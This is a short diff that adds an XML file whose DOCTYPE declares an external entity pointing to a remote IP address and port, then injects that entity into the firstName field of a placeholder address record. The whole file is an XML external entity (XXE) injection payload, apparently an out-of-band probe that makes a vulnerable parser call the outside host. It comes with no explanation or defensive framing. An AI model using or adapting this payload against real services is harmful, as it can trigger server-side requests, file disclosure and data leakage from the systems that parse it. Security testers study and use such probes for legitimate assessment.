@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://94.72.115.102:9000/TEST.ext" >]> 
+<root>
+ <root>
+  <firstName>&xxe;</firstName>
+  <lastName/>
+  <country>United States</country>
+  <city>ddd</city>
+  <postalCode>ddd</postalCode>
+ </root>
+</root>
